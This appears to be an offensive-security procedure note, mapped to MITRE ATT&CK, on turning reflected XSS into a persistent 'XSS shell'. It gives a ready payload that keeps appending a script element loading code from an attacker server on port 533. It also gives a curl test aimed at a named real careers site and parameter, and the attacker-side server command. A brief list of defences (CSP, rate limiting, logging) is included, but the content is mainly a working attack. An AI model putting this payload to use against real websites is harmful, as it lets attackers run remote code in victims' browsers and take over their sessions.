---
id: proc-uuid-3
tags:
  - xss
  - external-load
  - weaponization
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-13T23:52:43.734Z'
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Weaponize XSS for External Script Loading

## Summary

This procedure upgrades the basic XSS payload to repeatedly load and execute an external script from the attacker's server, enabling advanced persistence.

## Description

Replace the alert with a setInterval loop that creates and appends a <script> element sourcing from attacker IP:port. This turns one-time execution into a hook for an XSS shell. Requires public attacker server. Outcome: Victim's browser fetches and runs remote JS on page load.

## Requirements

1. Public attacker server with script hosted
2. Open port (e.g., 533)
3. URL encoding for the advanced payload

## Defense

Defensive measures and detection strategies:

- Strict CSP to prevent external script loads
- Rate limiting on parameter inputs
- Logging of unusual JS object creations in responses

## Objectives

1. Achieve persistent script execution
2. Bridge to external control
3. Enable shell setup

## Instructions

### Step 1: Craft Weaponized Payload

**Context**: Build JS to load external resource indefinitely.

**Command** (Manual encoding):

Payload: <script>setInterval(function(){d=document;z=d.createElement("script");z.src="//AttackerServerIP:533";d.body.appendChild(z)},0)</script>
Encode and append to URL.

```bash
# Example curl for testing (replace IP/port)
curl "https://careers.informatica.com/apply?isJTN=[encoded_payload]"
```

> Expected: Response reflects payload; browser requests //AttackerServerIP:533.

### Step 2: Host and Verify Load

**Context**: Ensure external script is accessible.

**Command** (Server side, e.g., python -m http.server 533)

Monitor for incoming GET requests.

> Success: Logs show browser fetching script.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[xss]]
- [[Persistence]]
